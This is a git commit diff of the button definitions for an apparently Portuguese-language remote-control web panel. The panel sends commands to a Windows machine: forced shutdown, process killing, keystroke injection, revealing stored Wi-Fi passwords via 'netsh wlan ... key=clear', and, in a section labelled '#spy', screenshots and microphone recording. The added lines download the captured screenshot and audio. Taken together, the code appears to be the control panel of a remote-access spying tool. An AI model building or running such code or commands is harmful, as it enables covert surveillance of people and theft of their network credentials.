078362cdde899c712fa60a145a4c6e8989160c8d
NobreHD <leo.nobre.hd@gmail.com>
2020-09-30 19:19:54 +0100

    Botões "Obter Audio" e "Obter ScreenShot" realocados

--- static/buttons.js
+++ static/buttons.js
@@ -18,20 +18,22 @@ class Button {
 
 // Buttons Declarations
 let buttons = [];
-buttons.push(new Button("Bloquear",                  "btn-success",  "#shutdown","putIn('!CM rundll32.exe user32.dll,LockWorkStation');"));
-buttons.push(new Button("Hibernar",                  "btn-info",     "#shutdown","putIn('!CM rundll32.exe PowrProf.dll,SetSuspendState');"));
-buttons.push(new Button("Encerrar",                  "btn-danger",   "#shutdown","putIn('!CM shutdown -f -s');"));
-buttons.push(new Button("Reiniciar",                 "btn-danger",   "#shutdown","putIn('!CM shutdown -f -r');"));
-buttons.push(new Button("IP Config",                 "btn-secondary","#network","putIn('!CM ipconfig');"));
-buttons.push(new Button("WIFI Acessadas",            "btn-secondary","#network","putIn('!CM netsh wlan show profiles');"));
-buttons.push(new Button("Password do WIFI",          "btn-dark",     "#network","getPrompt('Nome de Rede:','!CM netsh wlan show profile name=?? key=clear', true);"));
-buttons.push(new Button("Lista de Programas Abertos","btn-secondary","#program","putIn('!CM tasklist');"));
-buttons.push(new Button("Encerrar Programa",         "btn-dark",     "#program","getPrompt('PID do Programa:','!CM taskkill /PID ?? /f', false);"));
+buttons.push(new Button("Bloquear",                  "btn-success",  "#shutdown",   "putIn('!CM rundll32.exe user32.dll,LockWorkStation');"));
+buttons.push(new Button("Hibernar",                  "btn-info",     "#shutdown",   "putIn('!CM rundll32.exe PowrProf.dll,SetSuspendState');"));
+buttons.push(new Button("Encerrar",                  "btn-danger",   "#shutdown",   "putIn('!CM shutdown -f -s');"));
+buttons.push(new Button("Reiniciar",                 "btn-danger",   "#shutdown",   "putIn('!CM shutdown -f -r');"));
+buttons.push(new Button("IP Config",                 "btn-secondary","#network",    "putIn('!CM ipconfig');"));
+buttons.push(new Button("WIFI Acessadas",            "btn-secondary","#network",    "putIn('!CM netsh wlan show profiles');"));
+buttons.push(new Button("Password do WIFI",          "btn-dark",     "#network",    "getPrompt('Nome de Rede:','!CM netsh wlan show profile name=?? key=clear', true);"));
+buttons.push(new Button("Lista de Programas Abertos","btn-secondary","#program",    "putIn('!CM tasklist');"));
+buttons.push(new Button("Encerrar Programa",         "btn-dark",     "#program",    "getPrompt('PID do Programa:','!CM taskkill /PID ?? /f', false);"));
 buttons.push(new Button("Mostrar Mensagem",          "btn-dark",     "#interaction","getPrompt('Mensagem:','!MB ??', false);"));
 buttons.push(new Button("Digitar Mensagem",          "btn-dark",     "#interaction","getPrompt('Mensagem:','!TT ??', false);"));
 buttons.push(new Button("Combinação de Teclas",      "btn-dark",     "#interaction","getPrompt('Combinação (Separador: +):','!TC ??', false);"));
-buttons.push(new Button("ScreenShot",                "btn-dark",     "#spy","putIn('!PS');"));
-buttons.push(new Button("Gravar Microfone",          "btn-dark",     "#spy","getPrompt('Segundos: ','!RA ??', false);"));
+buttons.push(new Button("ScreenShot",                "btn-success",  "#spy",        "putIn('!PS');"));
+buttons.push(new Button("Gravar Microfone",          "btn-success",  "#spy",        "getPrompt('Segundos: ','!RA ??', false);"));
+buttons.push(new Button("Obter ScreenShot",          "btn-danger",   "#spy",        "window.location.href = '/download/ps.png'"));
+buttons.push(new Button("Obter Audio",               "btn-danger",   "#spy",        "window.location.href = '/download/output.wav'"));
 
 // Display buttons on Page
     buttons.forEach(button => $(button.getClass()).append(button.string()));
